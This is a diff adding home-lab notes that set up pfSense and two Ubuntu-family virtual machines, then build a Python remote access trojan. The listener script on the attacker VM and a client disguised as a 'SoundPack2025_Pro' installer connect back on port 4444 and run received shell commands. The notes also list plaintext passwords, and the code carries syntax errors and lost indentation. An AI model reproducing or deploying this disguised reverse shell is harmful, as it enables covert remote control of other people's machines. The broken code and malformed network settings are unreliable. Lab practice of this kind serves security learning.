@@ -1,0 +1,120 @@
+Machine with all virtual machines has the credentials “321” as the username and “Bear$#2025” as the password. 
+
+
+Created pfSense virtual machine named “pfSense”, created LAN segment called “cxltwxlf”, set memory to 256mb, storage to 20gb, minimum needed. Added NAT segment. Set WAN to em0 and LAN to em1. Assigned LAN IPv4 address to 10.10.10.1/28, as well as DHCP server address range to 10.10.10.50-10.10.11-200. 
+
+
+Set up UwUntu virtual machine named “UwUntu”, minimum allocations used. 2gb memory, storage to 20gb. Set username to “cxltwxlf” and password to “C0lt1337”. Set device name to “cxltwxlf-uwuntu". Set machine IP to 10.10.10.5/28. Network connection called “UwUntu IP”. Set default gateway to 10.10.10.1. 
+
+
+Set up Lubuntu virtual machine named “Lubuntu 2”, recommended allocations used. 2gb memory, storage to 20gb. Set username to “cxltwxlf” and password to “C0lt1337”. Set machine IP to 10.10.10.6/28. Network connection called “Lubuntu IP”. Set default gateway to 10.10.10.1.  Updated software, Installed Apache2 and OpenSSH on 2/4/2025. 
+
+
+Created Remote Access Trojan (RAT) in three files, one on the attacker client, UwUntu and two on the victim client, Lubuntu. Successfully connected to Lubuntu terminal from UwUntu machine on 4/22/2025. 
+
+ 
+UwUntu Python RAT: SillyRat.py 
+
+
+import socket 
+HOST = ‘0.0.0.0’ 
+PORT = 4444 
+
+ 
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+server.bind((HOST, PORT)) 
+server.listen(1) 
+print(f”[+] Listening on {HOST}:{PORT}...”) 
+
+ 
+
+client_socket, client_address = server.accept() 
+
+print(f”[+] Connection from {client_address}”) 
+
+ 
+
+while True: 
+
+command = input(“Evil Hackerman> “) 
+
+if command.lower() == “exit” 
+
+client_socket.send(command.encode()) 
+
+break 
+
+ 
+
+client_socket.send(command.encode()) 
+
+response = client_socket.recv(4096).decode() 
+
+print(response) 
+
+ 
+
+client_socket.close() 
+
+server.close() 
+
+ 
+
+ 
+
+Lubuntu “Installer File”: soundpack2025_Pro.sh 
+
+ 
+
+!#/bin/bash 
+
+ 
+
+Python3 /home/cxltwxlf/Desktop/SoundPack2025_Pro/exampleSound.py 
+
+ 
+
+ 
+
+Lubuntu “Example Sound File” RAT: exampleSound.py 
+
+import socket 
+
+import subprocess 
+
+ 
+
+SERVER_HOST = ‘10.10.10.5’ 
+
+SERVER_PORT = 4444 
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+
+client.connect((SERVER_HOST, SERVER_PORT)) 
+
+ 
+
+while True: 
+
+command = client.recv(1024).decode() 
+
+ 
+
+if command.lower() == “exit” 
+
+break 
+
+try: 
+
+output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT) 
+
+Except subprocess.CalledProcessError as e: 
+
+output = e.output 
+
+ 
+
+client.send(output or b”[+] Command executed with no output”) 
+
+client.close() 
